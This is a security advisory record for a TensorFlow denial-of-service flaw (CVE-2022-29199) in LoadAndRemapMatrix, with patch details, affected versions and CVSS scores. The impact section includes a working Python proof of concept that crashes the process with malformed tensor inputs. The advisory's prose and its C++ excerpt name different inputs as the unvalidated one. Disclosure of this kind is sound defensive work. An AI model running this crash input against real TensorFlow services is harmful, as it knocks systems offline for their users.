advisory_id: GHSA-p9rc-rmr5-529j
datasource_id: github_osv_importer_v2/GHSA-p9rc-rmr5-529j
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-p9rc-rmr5-529j/GHSA-p9rc-rmr5-529j.json
aliases:
  - CVE-2022-29199
summary: |
  Missing validation causes denial of service via `LoadAndRemapMatrix`
  ### Impact
  The implementation of [`tf.raw_ops.LoadAndRemapMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/load_and_remap_matrix_op.cc#L70-L98) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

  ```python
  import tensorflow as tf

  ckpt_path = tf.constant(
      "/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0", shape=[], dtype=tf.string)
  old_tensor_name = tf.constant(
      "/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0", shape=[], dtype=tf.string)

  row_remapping = tf.constant(0, shape=[], dtype=tf.int64)
  col_remapping = tf.constant(3, shape=[3], dtype=tf.int64)
  initializing_values = tf.constant([], shape=[0, 1], dtype=tf.float32)

  tf.raw_ops.LoadAndRemapMatrix(
    ckpt_path=ckpt_path,
    old_tensor_name=old_tensor_name,
    row_remapping=row_remapping,
    col_remapping=col_remapping,
    initializing_values=initializing_values,
    num_rows=1,
    num_cols=1)
  ```

  The code assumes `initializing_values` is a vector but there is no validation for this before accessing its value:

  ```cc
  OP_REQUIRES_OK(context, context->input("row_remapping", &row_remapping_t));
  const auto row_remapping = row_remapping_t->vec<int64_t>();
  ```

  ### Patches
  We have patched the issue in GitHub commit [3150642acbbe254e3c3c5d2232143fa591855ac9](https://github.com/tensorflow/tensorflow/commit/3150642acbbe254e3c3c5d2232143fa591855ac9).

  The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

  ### For more information
  Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

  ### Attribution
  This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.
impacted_packages:
  - purl: pkg:pypi/tensorflow
    affected_versions: vers:pypi/<2.6.4
    fixed_versions: vers:pypi/2.6.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/tensorflow
    affected_versions: vers:pypi/>=2.7.0|<2.7.2
    fixed_versions: vers:pypi/2.7.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/tensorflow
    affected_versions: vers:pypi/>=2.8.0|<2.8.1
    fixed_versions: vers:pypi/2.8.1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/tensorflow-cpu
    affected_versions: vers:pypi/<2.6.4
    fixed_versions: vers:pypi/2.6.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/tensorflow-cpu
    affected_versions: vers:pypi/>=2.7.0|<2.7.2
    fixed_versions: vers:pypi/2.7.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/tensorflow-cpu
    affected_versions: vers:pypi/>=2.8.0|<2.8.1
    fixed_versions: vers:pypi/2.8.1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/tensorflow-gpu
    affected_versions: vers:pypi/<2.6.4
    fixed_versions: vers:pypi/2.6.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/tensorflow-gpu
    affected_versions: vers:pypi/>=2.7.0|<2.7.2
    fixed_versions: vers:pypi/2.7.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:pypi/tensorflow-gpu
    affected_versions: vers:pypi/>=2.8.0|<2.8.1
    fixed_versions: vers:pypi/2.8.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-p9rc-rmr5-529j/GHSA-p9rc-rmr5-529j.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-20
references:
  - url: https://github.com/tensorflow/tensorflow
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/load_and_remap_matrix_op.cc#L70-L98
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/commit/3150642acbbe254e3c3c5d2232143fa591855ac9
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p9rc-rmr5-529j
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-29199
    reference_type:
    reference_id: CVE-2022-29199
